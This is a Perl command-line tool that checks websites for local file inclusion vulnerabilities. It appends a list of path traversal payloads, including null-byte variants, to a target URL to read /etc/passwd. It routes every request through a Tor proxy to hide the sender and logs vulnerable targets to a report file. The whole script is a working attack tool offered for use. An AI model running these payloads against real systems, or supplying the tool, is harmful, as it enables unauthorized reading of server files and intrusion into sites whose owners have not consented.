#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request;
use warnings;
use Socket;
use URI;

system('clear');
print "\x1b[30;38;5;145m[\x1b[1;38;5;222m Title \x1b[0m\x1b[30;38;5;145m]\x1b[0m\x1b[1;38;5;111m Check if a website has LFI vulnerability - upgraded 2020/05/23\x1b[0m
                \x1b[0;33m\x1b[0m\x1b[1;37mــــــ\x1b[1;37m❖\x1b[0m\x1b[1;37mــــــ\x1b[0m
  .----------------.  .----------------.  .----------------.
 | \x1b[1;48;5;147m.--------------.\x1b[0m || \x1b[1;48;5;160m.--------------.\x1b[0m || \x1b[1;48;5;130m.--------------.\x1b[0m |
 | \x1b[1;48;5;147m|   _____      |\x1b[0m || \x1b[1;48;5;160m|  _________   |\x1b[0m || \x1b[1;48;5;130m|     _____    |\x1b[0m |
 | \x1b[1;48;5;147m|  |_   _|     |\x1b[0m || \x1b[1;48;5;160m| |_   ___  |  |\x1b[0m || \x1b[1;48;5;130m|    |_   _|   |\x1b[0m |
 | \x1b[1;48;5;147m|    | |       |\x1b[0m || \x1b[1;48;5;160m|   | |_   \_|  |\x1b[0m || \x1b[1;48;5;130m|      | |     |\x1b[0m |
 | \x1b[1;48;5;147m|    | |   _   |\x1b[0m || \x1b[1;48;5;160m|   |  _|      |\x1b[0m || \x1b[1;48;5;130m|      | |     |\x1b[0m |
 | \x1b[1;48;5;147m|   _| |__/ |  |\x1b[0m || \x1b[1;48;5;160m|  _| |_       |\x1b[0m || \x1b[1;48;5;130m|     _| |_    |\x1b[0m |
 | \x1b[1;48;5;147m|  |________|  |\x1b[0m || \x1b[1;48;5;160m| |_____|      |\x1b[0m || \x1b[1;48;5;130m|    |_____|   |\x1b[0m |
 | \x1b[1;48;5;147m|              |\x1b[0m || \x1b[1;48;5;160m|              |\x1b[0m || \x1b[1;48;5;130m|              |\x1b[0m |
 | \x1b[1;48;5;147m'--------------'\x1b[0m || \x1b[1;48;5;160m'--------------'\x1b[0m || \x1b[1;48;5;130m'--------------'\x1b[0m | v2
  '----------------'  '----------------'  '----------------'
[\x1b[1;38;5;119m + \x1b[0m] Automatically check for vulnerability in LFI :
[\x1b[1;38;5;197m ! \x1b[0m] input website without http or https :

[\x1b[1;38;5;113m Example \x1b[0m]\x1b[30;38;5;114m target.com/val.php?val= \x1b[0m\n\n";

print "[\x1b[1;38;5;255m + \x1b[0m] \x1b[1;38;5;197mwebsite:\x1b[0m ";chomp($link = <STDIN>);
if($link !~ /http:\/\//){
  $link = "http://$link";
}
$host = $link;
$useragent = LWP::UserAgent->new;
###########################################
#Tor - proxy section - 0x1
#
$useragent->proxy([qw(http https)] => 'socks://127.0.0.1:9050');
###########################################
$uri = URI->new( $host );
($clearhost) = $host =~ m!(https?://[^:/]+)!;
$ip_addr = gethostbyname( $uri->host );
$target_ip = inet_ntoa( $ip_addr );
$response = $useragent->head($host);
$resp = $useragent->head($host);
$xc0de = $resp->code;
$Xnzone = "\x1b[1;37m";
$endzone = "\x1b[0m";
print "[\x1b[1;38;5;255m + \x1b[0m] \x1b[1;38;5;190mHost          : $Xnzone $clearhost $endzone\x1b[0m\n";
print "[\x1b[1;38;5;255m + \x1b[0m] \x1b[1;38;5;192mstatus        : $Xnzone $xc0de $endzone\x1b[0m\n";
print "[\x1b[1;38;5;255m + \x1b[0m] \x1b[1;38;5;191mIp address    : $Xnzone $target_ip $endzone\x1b[0m\n";
print "[\x1b[1;38;5;255m + \x1b[0m] \x1b[1;38;5;192mTor status    : $Xnzone $xc0de $endzone\x1b[0m\n";

if (($xc0de == "403") or ($xc0de == "404")){
  print "[\x1b[1;38;5;255m + \x1b[0m] \x1b[1;38;5;192meither 403 or 404\x1b[0m\n";
}


open(my $fhx, '>>', "report.txt");
print $fhx "######################\nHost: $clearhost\nStatus: $xc0de\nIp address: $target_ip\n######################\n";
close $fhx;

@vuls = ('etc/passwd',
'/etc/passwd',
'../etc/passwd',
'../../etc/passwd',
'../../../etc/passwd',
'../../../../etc/passwd',
'../../../../../etc/passwd',
'../../../../../../etc/passwd',
'../../../../../../../etc/passwd',
'../../../../../../../../etc/passwd',
'../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../etc/passwd',
'etc/passwd%2500',
'/etc/passwd%2500',
'../etc/passwd%2500',
'../../etc/passwd%2500',
'../../../etc/passwd%2500',
'../../../../etc/passwd%2500',
'../../../../../etc/passwd%2500',
'../../../../../../etc/passwd%2500',
'../../../../../../../etc/passwd%2500',
'../../../../../../../../etc/passwd%2500',
'../../../../../../../../../etc/passwd%2500',
'../../../../../../../../../../etc/passwd%2500',
'../../../../../../../../../../../etc/passwd%2500',
'etc/passwd%00',
'/etc/passwd%00',
'../etc/passwd%00',
'../../etc/passwd%00',
'../../../etc/passwd%00',
'../../../../etc/passwd%00',
'../../../../../etc/passwd%00',
'../../../../../../etc/passwd%00',
'../../../../../../../etc/passwd%00',
'../../../../../../../../etc/passwd%00',
'../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../etc/passwd%00');
print "\x1b[1;38;5;198m----------------------------------------------\x1b[0m\n";
$redzone = "\x1b[1;38;5;197m";
$greenzone = "\x1b[1;38;5;119m";
$endzone = "\x1b[0m";
foreach $scan(@vuls){
  $url = $link.$scan;
  $request = HTTP::Request->new(GET=>$url);
  $useragent = LWP::UserAgent->new();
  ###########################################
  #Tor - proxy section start with request ...
  # add # before $useragent->proxy(...) to shutdown TOR. 0x2 , 0x1 must be off too. line 36
  $useragent->proxy([qw(http https)] => 'socks://127.0.0.1:9050');
  ###########################################use warnings;
  $response = $useragent->request($request);
  $xcode = $response->code;
  if ($response->content =~ /Mod_Security/){$m1 = "Mode_Security ON";}else{$m1 = "";}
  if ($response->is_success && $response->content =~ /root:x:/){
    $resultzone = "\x1b[1;38;5;255m";
    $plod = "\x1b[1;38;5;139m";
    $msg = "$greenzone $xcode Vulnerable $endzone";
  }
  else
  {
    $resultzone = "\x1b[1;38;5;240m";
    $plod = "\x1b[1;38;5;139m";
    $msg = "$redzone $xcode Not Found $endzone";
  }
  open(my $fh, '>>', 'report.txt');
  print $fh "$link.$scan\n";
  close $fh;
  print "[$msg]$resultzone:$plod:payload:$resultzone:$link.$scan $endzone  $m1\n";
}
